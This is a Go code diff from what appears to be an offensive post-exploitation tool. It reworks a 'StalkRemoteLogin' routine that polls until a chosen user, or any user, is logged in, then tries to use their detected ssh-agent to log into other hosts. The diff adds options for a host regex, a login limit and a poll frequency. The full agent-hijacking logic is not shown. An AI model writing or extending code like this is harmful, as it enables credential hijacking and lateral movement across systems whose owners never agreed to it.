@@ -47,8 +47,6 @@ var (
 type LocalLoginStalkAction func(string, NetConn) error
 
 // string parameter is the user who logged into a remote system.
-type RemoteLoginStalkAction func(string) map[string][]sshLoginSuccess
-
 const (
 	L4ProtoTcp = iota
 	L4ProtoUdp = iota
@@ -121,6 +119,22 @@ type Who struct {
 	Pid int32
 	// Login time
 	Time int32
+}
+
+type StalkRemoteLoginAction func(string) map[string][]sshLoginSuccess
+
+// StalkRemoteLoginParams holds options for the StalkRemoteLogin functionality.
+type StalkRemoteLoginParams struct {
+	// Function to execute when the stalked user logs into the local system.
+	Action StalkRemoteLoginAction
+	// Attempt to login only to hosts that match this regex.
+	HostRegex string
+	// Limit login attempts. If login attempt reaches this limit, stop attempting logins.
+	LoginLimit uint
+	// Frequency to look for the user to be logged in
+	PollFrequency uint
+	// Only attempt logins as this user. If user is "*", try to stalk any user.
+	User string
 }
 
 // existingPaths returns a subset of paths that exist on the filesystem.
@@ -797,21 +811,20 @@ func StalkLocalLogin(user string, action LocalLoginStalkAction) error {
 // StalkRemoteLogin attempts to log into a remote system via two methods:
 // 1. If the presence of an ssh-agent is detected, attempt to use it to log into the same host.
 // 2. [not implemented] If the Control Master socket is recently created, attempt to use it
-func StalkRemoteLogin(user string, action RemoteLoginStalkAction) error {
-	/*
-			ticker := time.NewTicker(1 * time.Minute)
-			for {
+func StalkRemoteLogin(p StalkRemoteLoginParams) error {
+	var attempts uint
+	ticker := time.NewTicker(time.Duration(p.PollFrequency) * time.Second)
+	for attempts < p.LoginLimit {
 		select {
 		case <-ticker.C:
-	*/
-	// If the user in question is logged in, attempt to login to any host we know about
-	if isUserLoggedIn(user) {
-		fmt.Println(action(user))
+			// If the user in question is logged in, attempt to login to any host we know about
+			if isUserLoggedIn(p.User) {
+				fmt.Println(p.Action(p.User))
+				attempts++
+			}
+			fmt.Println(attempts, p.LoginLimit)
+		}
 	}
-	/*
-		}
-		}
-	*/
 	return nil
 }
 
@@ -822,6 +835,7 @@ func AttemptRemoteLogin(user string) map[string][]sshLoginSuccess {
 	loggedIn := GetWho()
 	found := map[string][]sshLoginSuccess{}
 	fmt.Println(loggedIn)
+	fmt.Println(hosts)
 	for _, host := range hosts {
 		for _, login := range loggedIn {
 			if user == login.User || user == "*" {
